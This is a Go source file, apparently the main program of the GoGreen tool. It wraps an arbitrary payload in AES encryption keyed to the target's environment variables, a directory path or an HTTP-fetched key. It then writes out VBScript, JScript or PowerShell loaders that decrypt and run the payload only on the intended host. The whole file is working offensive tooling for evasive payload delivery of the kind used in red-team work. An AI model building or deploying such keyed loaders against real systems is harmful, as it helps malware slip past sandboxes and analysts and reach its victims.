package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"

	"github.com/leoloobeek/GoGreen/lib"
)

func main() {
	conf := flag.String("config", "", "Config file to read. Default ./config.json.")
	flagHttpKey := flag.String("httpkey", "", "Manual HttpKey to use. GoGreen will retrieve it's own by default.")
	flag.Parse()
	config := parseConfig(*conf)
	if config == nil {
		return
	}
	payloadWriter := setupPayloadWriter(config.Language)

	if payloadWriter == nil {
		fmt.Println("[!] Specified language in config.json not supported")
		return
	}

	// get payload from config or file
	payload := config.Payload
	if payload == "" {
		pFile, err := readFile(config.PayloadPath)
		if err != nil {
			fmt.Printf("[!] Error reading payload from %s\n", config.PayloadPath)
			return
		}
		payload = string(pFile)
		if payload == "" {
			fmt.Printf("[!] Payload file %s was empty", config.PayloadPath)
			return
		}
	}

	// Apply httpkey here (if needed)
	httpKey := ""
	if config.HttpKeyUrl != "" {
		var err error
		payload, httpKey, err = httpKeyCode(*flagHttpKey, payload, config, payloadWriter)
		if err != nil {
			return
		}
	}

	// generate payload hash
	mb, err := strconv.Atoi(config.MinusBytes)
	if (err != nil) || (mb > len(payload) || mb < 0) {
		fmt.Println("[!] MinusBytes invalid. Is it less than 0 or greater than payload size? Setting to 1...")
		config.MinusBytes = "1"
		mb = 1
	}
	payloadHash := lib.GenerateSHA512(payload[:(len(payload) - mb)])

	// generate key
	if config.StartDir == "" {
		config.PathKey = ""
	}
	key, envVarOrder := buildKey(config.EnvVars, config.PathKey)

	// read in base code
	result, err := baseCode(config.WSHAutoVersion, payloadWriter)
	if err != nil {
		return
	}

	// if a StartDir was specified in config.json, add in directory walking
	result, err = directoryCode(result, config.StartDir, config.Depth, payloadWriter)
	if err != nil {
		return
	}

	// set up env vars code
	result, err = envVarCode(result, envVarOrder, payloadWriter)
	if err != nil {
		return
	}

	// TODO: handle multiple SHA512 iterations
	keyHash := lib.GenerateSHA512(strings.ToLower(key))[:32]
	text, iv, err := lib.AESEncrypt([]byte(keyHash), []byte(payload))

	if err != nil {
		fmt.Printf("[!] Error received encrypting: %s", err)
		return
	}

	result = bytes.Replace(result, []byte("~AESIVBASE64~"), []byte(iv), 1)
	result = bytes.Replace(result, []byte("~ENCRYPTEDBASE64~"), []byte(text), 1)
	result = bytes.Replace(result, []byte("~PAYLOADHASH~"), []byte(payloadHash), 1)
	result = bytes.Replace(result, []byte("~MINUSBYTES~"), []byte(string(config.MinusBytes)), 1)

	outfile := "payload" + payloadWriter.Extension
	writeFile(outfile, result)

	fmt.Println("\nPAYLOAD DETAILS-----------------------")
	fmt.Println("Output File:        " + outfile)
	fmt.Println("Environmental Keys: " + key)
	fmt.Println("Decryption Key:     " + keyHash)
	fmt.Println("Payload Hash:       " + payloadHash)
	if httpKey != "" {
		fmt.Println("HTTP Key:           " + httpKey)
	}

}

// Config defines structure to be read from config.json
type Config struct {
	Language       string
	WSHAutoVersion string
	StartDir       string
	Depth          string
	PathKey        string
	EnvVars        map[string]string
	Payload        string
	PayloadPath    string
	MinusBytes     string
	HttpKeyUrl     string
	HttpKeyUA      string
	HttpKeyRetry   string
}

// PayloadWriter for handling what to write
type PayloadWriter struct {
	Language            string
	WSHAutoVersion      string
	BaseTemplate        string
	DirTemplate         string
	EnvKeyTemplate      string
	AutoVersionTemplate string
	HttpKeyTemplate     string
	HttpKeyTestTemplate string
	EnvKeyCode          string
	Extension           string
}

func setupPayloadWriter(lang string) *PayloadWriter {
	switch lang {
	case "vbscript":
		return &PayloadWriter{
			Language:            "vbscript",
			BaseTemplate:        "data/vbscript/base.vbs",
			DirTemplate:         "data/vbscript/directory.vbs",
			EnvKeyTemplate:      "data/vbscript/envkey.vbs",
			AutoVersionTemplate: "data/vbscript/autoversion.vbs",
			HttpKeyTemplate:     "data/vbscript/httpkey.vbs",
			HttpKeyTestTemplate: "data/vbscript/httpkey-test.vbs",
			EnvKeyCode:          "oEnv(\"%s\")",
			Extension:           ".vbs"}
	case "jscript":
		return &PayloadWriter{
			Language:            "jscript",
			BaseTemplate:        "data/jscript/base.js",
			DirTemplate:         "data/jscript/directory.js",
			EnvKeyTemplate:      "data/jscript/envkey.js",
			AutoVersionTemplate: "data/jscript/autoversion.js",
			HttpKeyTemplate:     "data/jscript/httpkey.js",
			HttpKeyTestTemplate: "data/jscript/httpkey-test.js",
			EnvKeyCode:          "oEnv(\"%s\")",
			Extension:           ".js"}
	case "powershell":
		return &PayloadWriter{
			Language:            "powershell",
			BaseTemplate:        "data/powershell/base.ps1",
			DirTemplate:         "data/powershell/directory.ps1",
			EnvKeyTemplate:      "data/powershell/envkey.ps1",
			AutoVersionTemplate: "",
			HttpKeyTemplate:     "data/powershell/httpkey.ps1",
			HttpKeyTestTemplate: "data/powershell/httpkey-test.ps1",
			EnvKeyCode:          "$oEnv.Invoke(\"%s\")",
			Extension:           ".ps1"}
	default:
		return nil
	}
}

func parseConfig(configPath string) *Config {
	if configPath == "" {
		configPath = "config.json"
	}
	file, err := os.Open(configPath)
	if err != nil {
		fmt.Println("[!] Error reading config.json")
		return nil
	}
	decoder := json.NewDecoder(file)
	config := Config{}
	err = decoder.Decode(&config)
	if err != nil {
		fmt.Println("[!] Error parsing config.json:", err)
		return nil
	}
	return &config
}

func readFile(path string) ([]byte, error) {
	fileBytes, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, errors.New("[!] readFile: Error reading file")
	}
	return fileBytes, nil
}

func writeFile(filename string, contents []byte) {
	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}

	defer f.Close()

	_, err = f.Write(contents)
	if err != nil {
		panic(err)
	}
}

// Get base code to start
func baseCode(autoVersion string, pw *PayloadWriter) ([]byte, error) {
	baseCode, err := readFile(pw.BaseTemplate)
	if err != nil {
		fmt.Printf("[!] Unable to read %s\n", (pw.BaseTemplate))
		return nil, err
	}

	if pw.AutoVersionTemplate != "" {
		if strings.ToLower(autoVersion) == "yes" {
			av, err := readFile(pw.AutoVersionTemplate)
			if err != nil {
				fmt.Printf("[!] Unable to read %s\n", (pw.AutoVersionTemplate))
				return nil, err
			}
			baseCode = bytes.Replace(baseCode, []byte("~AUTOVERSION~"), []byte(av), 1)
		} else {
			baseCode = bytes.Replace(baseCode, []byte("~AUTOVERSION~"), []byte(""), 1)
		}
	}

	return baseCode, nil
}

// Get directory code for directory walking
func directoryCode(text []byte, startDir, depth string, pw *PayloadWriter) ([]byte, error) {
	if startDir != "" {
		contents, err := readFile(pw.DirTemplate)
		if err != nil {
			fmt.Printf("[!] Error reading %s\n", pw.DirTemplate)
			return nil, err
		}

		// JScript needs escaped slashes, VBS does not
		if pw.Language == "jscript" {
			startDir = strings.Replace(startDir, "\\", "\\\\", -1)
		}

		// To save on payload code size just assigning
		// a huge number for now
		if depth == "" {
			depth = "100000"
		}

		result := bytes.Replace(text, []byte("~WALKOS~"), contents, 1)
		result = bytes.Replace(result, []byte("~STARTDIR~"), []byte(startDir), 1)
		result = bytes.Replace(result, []byte("~DEPTH~"), []byte(depth), 1)

		return result, nil
	}
	result := bytes.Replace(text, []byte("~WALKOS~"), []byte(""), 1)
	return result, nil
}

// Set up the environmental vars code within the script
// TODO: This got overly complex, need to simplify
func envVarCode(text []byte, envVarCode []string, pw *PayloadWriter) ([]byte, error) {
	if len(envVarCode) > 0 {
		contents, err := readFile(pw.EnvKeyTemplate)
		if err != nil {
			fmt.Printf("[!] Error reading %s\n", pw.EnvKeyTemplate)
			return nil, err
		}

		result := bytes.Replace(text, []byte("~ENVVAR~"), contents, 1)

		envs := fmt.Sprintf(pw.EnvKeyCode, envVarCode[0])
		if len(envVarCode) > 1 {
			for _, envVar := range envVarCode[1:] {
				envs += fmt.Sprintf(", "+pw.EnvKeyCode, envVar)
			}
		}
		result = bytes.Replace(result, []byte("~ENVVARS~"), []byte(envs), 1)

		return result, nil
	}
	result := bytes.Replace(text, []byte("~ENVVAR~"), []byte(""), 1)
	return result, nil
}

// returns the new payload, httpkey, and err
func httpKeyCode(httpKey, payload string, config *Config, pw *PayloadWriter) (string, string, error) {
	if httpKey == "" {
		var err error
		httpKey, err = lib.GenerateHttpKey(config.HttpKeyUrl, config.HttpKeyUA)
		if err != nil {
			fmt.Printf("[!] Error accessing %s\n%s\n", config.HttpKeyUrl, err)
			return "", "", err
		}
	}

	payloadHash := lib.GenerateSHA512(payload)
	text, iv, err := lib.AESEncrypt([]byte(httpKey), []byte(payload))
	if err != nil {
		fmt.Printf("[!] Error received encrypting: %s\n", err)
		return "", "", err
	}

	contents, err := readFile(pw.HttpKeyTemplate)
	if err != nil {
		return "", "", err
	}

	if config.HttpKeyUA == "" {
		config.HttpKeyUA = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
	}

	result := bytes.Replace(contents, []byte("~HKPAYLOADHASH~"), []byte(payloadHash), 1)
	result = bytes.Replace(result, []byte("~HKPAYLOAD~"), []byte(text), 1)
	result = bytes.Replace(result, []byte("~RETRYNUM~"), []byte(config.HttpKeyRetry), 1)
	result = bytes.Replace(result, []byte("~HKURL~"), []byte(config.HttpKeyUrl), 1)
	result = bytes.Replace(result, []byte("~HKUSERAGENT~"), []byte(config.HttpKeyUA), 1)
	result = bytes.Replace(result, []byte("~HKIV~"), []byte(iv), 1)

	httpKeyTestCode(config.HttpKeyUrl, config.HttpKeyUA, httpKey, pw)

	return string(result), httpKey, nil
}

func httpKeyTestCode(url, ua, httpKey string, pw *PayloadWriter) {
	contents, err := readFile(pw.HttpKeyTestTemplate)
	if err != nil {
		return
	}

	result := bytes.Replace(contents, []byte("~HTTPKEY~"), []byte(httpKey), 1)
	result = bytes.Replace(result, []byte("~HKURL~"), []byte(url), 1)
	result = bytes.Replace(result, []byte("~HKUSERAGENT~"), []byte(ua), 1)

	outfile := "httpkey-tester" + pw.Extension
	fmt.Printf("[*] Make sure to test the httpkey with %s!\n", outfile)
	writeFile(outfile, result)
}

// buildKey builds the final key with env vars, path, etc. and also returns
// the order of the env vars (maps don't always come out in same order)
// key = [env var 1][env var 2][env var N][file path]
func buildKey(envVars map[string]string, filePath string) (string, []string) {
	result := ""
	envVarOrder := make([]string, len(envVars))

	i := 0
	for k, v := range envVars {
		result += v
		envVarOrder[i] = k
		i++
	}
	result += filePath

	return result, envVarOrder
}
